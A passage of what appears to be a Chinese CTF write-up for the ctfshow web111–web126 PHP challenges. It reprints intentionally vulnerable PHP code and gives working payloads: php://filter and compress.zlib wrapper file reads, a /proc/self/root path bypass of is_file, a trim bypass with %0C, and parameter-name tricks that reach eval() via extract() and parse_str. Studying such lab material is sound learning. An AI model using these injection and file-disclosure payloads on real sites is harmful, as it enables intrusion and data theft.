返回当前工作目录</p><p>payload：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">?<span class="hljs-built_in">v1</span><span class="hljs-symbol">=FilesystemIterator</span>&amp;<span class="hljs-built_in">v2</span><span class="hljs-symbol">=getcwd</span><br></code></pre></td></tr></table></figure><p>回显了一个fl36dga.txt文件，在url中输入即可获取flag</p><h2 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h2><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">highlight_file(__FILE__);<br>error_reporting(0);<br>include(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br>function getFlag(&amp;$v1,&amp;$v2)&#123;<br>    eval(<span class="hljs-string">&quot;$$v1 = &amp;$$v2;&quot;</span>);<br>    var_dump($$v1);<br>&#125;<br>if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;<br>    $v1 = $_GET[&#x27;v1&#x27;];<br>    $v2 = $_GET[&#x27;v2&#x27;];<br><br>    if(preg_match(&#x27;/\~|<span class="hljs-string"> </span>|<span class="hljs-string">\`</span>|<span class="hljs-string">\!</span>|<span class="hljs-string">\@</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">\\$</span>|<span class="hljs-string">\%</span>|<span class="hljs-string">\^</span>|<span class="hljs-string">\&amp;</span>|<span class="hljs-string">\*</span>|<span class="hljs-string">\(</span>|<span class="hljs-string">\)</span>|<span class="hljs-string">\_</span>|<span class="hljs-string">\-</span>|<span class="hljs-string">\+</span>|<span class="hljs-string">\=</span>|<span class="hljs-string">\&#123;</span>|<span class="hljs-string">\[</span>|<span class="hljs-string">\;</span>|<span class="hljs-string">\:</span>|<span class="hljs-string">\&quot;</span>|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">\,</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">\\\\</span>|<span class="hljs-string">\/</span>|<span class="hljs-string">[0-9]</span>|<span class="hljs-string">\&lt;</span>|<span class="hljs-string">\&gt;/&#x27;, $v1))&#123;</span><br><span class="hljs-string">            die(&quot;error v1&quot;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    if(preg_match(&#x27;/\~</span>|<span class="hljs-string"> </span>|<span class="hljs-string">\`</span>|<span class="hljs-string">\!</span>|<span class="hljs-string">\@</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">\\$</span>|<span class="hljs-string">\%</span>|<span class="hljs-string">\^</span>|<span class="hljs-string">\&amp;</span>|<span class="hljs-string">\*</span>|<span class="hljs-string">\(</span>|<span class="hljs-string">\)</span>|<span class="hljs-string">\_</span>|<span class="hljs-string">\-</span>|<span class="hljs-string">\+</span>|<span class="hljs-string">\=</span>|<span class="hljs-string">\&#123;</span>|<span class="hljs-string">\[</span>|<span class="hljs-string">\;</span>|<span class="hljs-string">\:</span>|<span class="hljs-string">\&quot;</span>|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">\,</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">\\\\</span>|<span class="hljs-string">\/</span>|<span class="hljs-string">[0-9]</span>|<span class="hljs-string">\&lt;</span>|<span class="hljs-string">\&gt;/&#x27;, $v2))&#123;</span><br><span class="hljs-string">            die(&quot;error v2&quot;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123;</span><br><span class="hljs-string">            getFlag($v1,$v2);</span><br><span class="hljs-string">    &#125; </span><br></code></pre></td></tr></table></figure><p>同样的v1&amp;v2只能输入字母，最下面的正则匹配表示v1&#x3D;ctfshow，<br>getflag中&amp;符号与c语言指针一样，在eval中<code>$$v1=&amp;$$v2</code>表示为变量覆盖<br>payload:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">v1</span>=ctfshow&amp;v2=flag<br></code></pre></td></tr></table></figure><p>回显为NULL，因为getflag里为局部变量，无法使用外部变量</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$GLOBALS</span> — 引用全局作用域中可用的全部变量</span><br>一个包含了全部变量的全局组合数组。变量的名字就是数组的键。<br></code></pre></td></tr></table></figure><p>所以对于该题，只要把$GLOBALS赋值给v2，然后v2再赋值给v1,即可将全部变量输出<br>payload：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">v1</span>=ctfshow&amp;v2=GLOBALS<br></code></pre></td></tr></table></figure><h2 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">highlight<span class="hljs-constructor">_file(<span class="hljs-params">__FILE__</span>)</span>;<br>error<span class="hljs-constructor">_reporting(0)</span>;<br><span class="hljs-keyword">function</span> filter($file)&#123;<br>    <span class="hljs-keyword">if</span>(preg<span class="hljs-constructor">_match(&#x27;<span class="hljs-operator">/</span>\.\.\<span class="hljs-operator">/</span>|<span class="hljs-params">http</span>|<span class="hljs-params">https</span>|<span class="hljs-params">data</span>|<span class="hljs-params">input</span>|<span class="hljs-params">rot13</span>|<span class="hljs-params">base64</span>|<span class="hljs-params">string</span><span class="hljs-operator">/</span><span class="hljs-params">i</span>&#x27;,$<span class="hljs-params">file</span>)</span>)&#123;<br>        die(<span class="hljs-string">&quot;hacker!&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        return $file;<br>    &#125;<br>&#125;<br>$file=$_GET<span class="hljs-literal">[&#x27;<span class="hljs-identifier">file</span>&#x27;]</span>;<br><span class="hljs-keyword">if</span>(! is<span class="hljs-constructor">_file($<span class="hljs-params">file</span>)</span>)&#123;<br>    highlight<span class="hljs-constructor">_file(<span class="hljs-params">filter</span>($<span class="hljs-params">file</span>)</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    echo <span class="hljs-string">&quot;hacker!&quot;</span>;<br>&#125; <br><br></code></pre></td></tr></table></figure><p><strong>is_file 函数可以使用包装器 伪协议来绕过</strong><br><strong>不影响file_get_contents highlight_file</strong></p><p>if(!is_file($file)){表示file文件不存在才能通过if<br>而is_file()和highlight_file()都可配合伪协议<br>所以我们使用一个伪协议<code>?file=php://filter/convert.base64-encode/resource=flag.php</code></p><p>又因为base64被过滤，我们不使用转换，去掉<code>/convert.base64-encode</code><br>所以</p><p>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter/resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$file</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(! <span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$file</span>));<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker!&quot;</span>;<br>&#125; <span class="hljs-meta">&lt;?php</span> <br><br></code></pre></td></tr></table></figure><p>上述代码增加了一个对filter的正则匹配，所以不能用上一题的办法，找一下其它的协议<br>payload:</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">compress</span>.zlib:<span class="hljs-comment">//flag.php</span><br></code></pre></td></tr></table></figure><p>换用读取压缩流</p><p>linux里<code>/proc/self/root</code>是指向根目录的，也就是如果在命令行中输入<code>ls /proc/self/root</code>,其实显示的内容是根目录下的内容，多次重复后绕过<code>is_file</code>目录溢出is_file判断为不是一个文件</p><p>payload:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gradle">?<span class="hljs-keyword">file</span>=<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>p<br>roc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root/pro<br>c<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span><br>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc/se<br>lf<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag.php<br></code></pre></td></tr></table></figure><h2 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">error<span class="hljs-constructor">_reporting(0)</span>;<br>highlight<span class="hljs-constructor">_file(<span class="hljs-params">__FILE__</span>)</span>;<br><span class="hljs-keyword">function</span> filter($file)&#123;<br>    <span class="hljs-keyword">if</span>(preg<span class="hljs-constructor">_match(&#x27;<span class="hljs-operator">/</span><span class="hljs-params">compress</span>|<span class="hljs-params">root</span>|<span class="hljs-params">zip</span>|<span class="hljs-params">convert</span>|\.\.\<span class="hljs-operator">/</span>|<span class="hljs-params">http</span>|<span class="hljs-params">https</span>|<span class="hljs-params">data</span>|<span class="hljs-params">data</span>|<span class="hljs-params">rot13</span>|<span class="hljs-params">base64</span>|<span class="hljs-params">string</span><span class="hljs-operator">/</span><span class="hljs-params">i</span>&#x27;,$<span class="hljs-params">file</span>)</span>)&#123;<br>        die(&#x27;hacker!&#x27;);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        return $file;<br>    &#125;<br>&#125;<br>$file=$_GET<span class="hljs-literal">[&#x27;<span class="hljs-identifier">file</span>&#x27;]</span>;<br>echo <span class="hljs-string">&quot;师傅们居然tql都是非预期 哼！&quot;</span>;<br><span class="hljs-keyword">if</span>(! is<span class="hljs-constructor">_file($<span class="hljs-params">file</span>)</span>)&#123;<br>    highlight<span class="hljs-constructor">_file(<span class="hljs-params">filter</span>($<span class="hljs-params">file</span>)</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    echo <span class="hljs-string">&quot;hacker!&quot;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这回正则匹配又改变了，过滤了compress，和root，所以上题的两种方法都用不成了，但是它并没有过滤filter，所以本题<br>payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter/resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$num</span></span>)</span>&#123;<br>    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;0x&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);<br>    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);<br>    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);<br>    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;e&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);<br>    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$num</span>;<br>&#125;<br><span class="hljs-variable">$num</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$num</span>) <span class="hljs-keyword">and</span> <span class="hljs-variable">$num</span>!==<span class="hljs-string">&#x27;36&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$num</span>)!==<span class="hljs-string">&#x27;36&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$num</span>)==<span class="hljs-string">&#x27;36&#x27;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-string">&#x27;36&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker!!&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker!!!&quot;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>is_numeric()函数在于检测变量是否为数字或数字字符串<br>trim(string,charlist)函数用于一处字符串两侧的空白字符或其它预定义字符，如charlist没有内容,trim()将去除这些字符</p><ul><li>“ “(ASCII 32(0X20)) 普通空格符。</li><li>“\t”(ASCII 9(0x09)) 制表符。</li><li>“\n”(ASCII 10(0x0A)) 换行符。</li><li>“\r”(ASCII 13(0x0D)) 回车符。</li><li>“\0”(ASCII 0(0x00)) 空字节符。</li><li>“\x0B”(ASCII 11 (0x0B)) 垂直制表符。</li></ul><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">num</span>=%0C36<br></code></pre></td></tr></table></figure><p>ascii表中0c为换页符，所以能绕过trim() 且弱比较不影响，filter()也为true<br>注：<br>num!&#x3D;&#x3D;36 为强类型比较，因num&#x3D;%0c36与36不一样，所以为true，<code>if($num==&#39;36&#39;)&#123;</code>为弱比较也为true，所以都能通过</p><h2 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>];<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;fun&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fl0g&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="hljs-variable">$c</span>)&amp;&amp;<span class="hljs-variable">$c</span>&lt;=<span class="hljs-number">18</span>)&#123;<br>         <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>.<span class="hljs-string">&quot;;&quot;</span>);  <br>         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fl0g</span>===<span class="hljs-string">&quot;flag_give_me&quot;</span>)&#123;<br>             <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>         &#125;<br>    &#125;<br>&#125; <br><br></code></pre></td></tr></table></figure><p>在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、+、点、[转换为下划线，但是用一个特性是可以绕过的，就是当[提前出现后，后面的点就不会再被转义了，例如：<code>CTF[SHOW.COM=&gt;CTF_SHOW.COM</code></p><p>if($fl0g&#x3D;&#x3D;&#x3D;”flag_give_me”)与前面第一个if有冲突，所以我们弃用这个if<br>eval()中可以运行php代码，所以<br>payload：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">POST:<br>CTF_SHOW=<span class="hljs-number">1</span>&amp;CTF[SHOW.COM=<span class="hljs-number">1</span>&amp;<span class="hljs-function"><span class="hljs-keyword">fun</span>=echo $flag</span><br></code></pre></td></tr></table></figure><p>正则匹配里要求的c&lt;&#x3D;18，在本地验证一下是否满足</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;echo $flag&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>&lt;=<span class="hljs-number">18</span>);<br></code></pre></td></tr></table></figure><p>返回结果为true<br>提交获得flag</p><h2 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>];<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;fun&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fl0g&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="hljs-variable">$c</span>)&amp;&amp;<span class="hljs-variable">$c</span>&lt;=<span class="hljs-number">16</span>)&#123;<br>         <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>.<span class="hljs-string">&quot;;&quot;</span>);<br>         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fl0g</span>===<span class="hljs-string">&quot;flag_give_me&quot;</span>)&#123;<br>             <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>         &#125;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>和上一题不一样的是，它过滤了flag和echo<br>方法一：<br>payload:</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">POST:<br>CTF_SHOW=<span class="hljs-number">1</span>&amp;CTF[SHOW.COM=<span class="hljs-number">1</span>&amp;<span class="hljs-function"><span class="hljs-keyword">fun</span>=<span class="hljs-title">highlight_file</span><span class="hljs-params">($_GET[<span class="hljs-number">1</span>])</span></span><br>GET:<br>?<span class="hljs-number">1</span>=flag.php<br></code></pre></td></tr></table></figure><p>因为if把fun中的flag过滤了，所以这样来绕过过滤</p><p>方法二：<br>payload:</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">POST:<br>CTF_SHOW=<span class="hljs-number">1</span>&amp;CTF[SHOW.COM=<span class="hljs-number">2</span>&amp;<span class="hljs-function"><span class="hljs-keyword">fun</span>=<span class="hljs-title">extract</span><span class="hljs-params">($_POST)</span></span>&amp;fl0g=flag_give_me<br></code></pre></td></tr></table></figure><p>extract变量覆盖，使fl0g有值通过最后的if</p><h2 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>];<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;fun&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fl0g&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;</span>, <span class="hljs-variable">$c</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">16</span>)&#123;<br>         <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>.<span class="hljs-string">&quot;;&quot;</span>);  <br>         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fl0g</span>===<span class="hljs-string">&quot;flag_give_me&quot;</span>)&#123;<br>             <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>         &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里禁用了g i f c o d，前面的方法都不能用了<br>利用$_SERVER[‘argv’]<br>$_SERVER[‘argv’]是一个包含了诸如头信息(hearder)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由web服务器创建。<br><code>&#39;argv&#39;</code><br>传递给该脚本的参数的数组。当脚本以命令行方式运行时，argv变量传递给程序c语言样式的命令行参数。当通过GET方式到用时，该变量包含query string。</p><p>意思就是通过$_SERVER[‘argv’]将$a变成数组，再利用数组的性质将fl0g&#x3D;flag_give_me传入，同时还绕过第一个if中的<code>!isset($_GET[&#39;fl0g])</code>,用+进行分隔，使得数组中有多个数值。<br>执行eval函数也就是执行$c既是parse_str($a[1]),使得fl0g&#x3D;flag_give_me,从而进入第三个if语句。<br><img src="/images/VFM8NQ1C93.png"></p><figure 